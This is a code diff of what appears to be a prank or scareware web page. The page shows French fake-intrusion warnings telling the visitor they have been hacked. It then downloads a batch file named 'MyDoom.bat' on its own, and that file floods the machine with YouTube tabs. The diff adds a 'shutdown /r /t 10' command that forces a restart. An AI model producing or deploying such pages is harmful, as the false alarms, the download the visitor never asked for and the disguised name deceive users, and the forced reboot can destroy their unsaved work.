@@ -2,25 +2,25 @@ document.body.classList.add("danger");
 
 const screen = document.getElementById("screen");
 const lines = [
-    "[!] Analyse de l'intégrité du système...",
-    "[!] Détection d'une activité suspecte...",
-    "[!] Tentative de neutralisation...",
-    "",
-    "❌ ERREUR FATALE : INTRUSION CONFIRMÉE",
-    "",
-    "⚠️ Tu as déjà été hacké...",
-    "⚠️ C'est trop tard...",
-    "⚠️ Bonne chance ! 😈",
+	"[!] Analyse de l'intégrité du système...",
+	"[!] Détection d'une activité suspecte...",
+	"[!] Tentative de neutralisation...",
+	"",
+	"❌ ERREUR FATALE : INTRUSION CONFIRMÉE",
+	"",
+	"⚠️ Tu as déjà été hacké...",
+	"⚠️ C'est trop tard...",
+	"⚠️ Bonne chance ! 😈",
 ];
 
 let i = 0;
 
 function writeLine() {
-    if (i < lines.length) {
-        screen.textContent += "\n" + lines[i];
-        i++;
-        setTimeout(writeLine, 500);
-    }
+	if (i < lines.length) {
+		screen.textContent += "\n" + lines[i];
+		i++;
+		setTimeout(writeLine, 500);
+	}
 }
 setTimeout(writeLine, 1000);
 
@@ -54,19 +54,7 @@ start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
 start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
 start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
 start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
-start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
-start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
-start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
-start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
-start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
-start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
-start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
-start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
-start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
-start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
-start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
-start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
-start    https://www.youtube.com/watch?v=dQw4w9WgXcQ
+start    shutdown /r /t 10
 echo **********************************************
 pause
 `;
@@ -78,5 +66,5 @@ link.href = URL.createObjectURL(blob);
 link.download = "MyDoom.bat";
 
 setTimeout(() => {
-    link.click();
+	link.click();
 }, 4000);
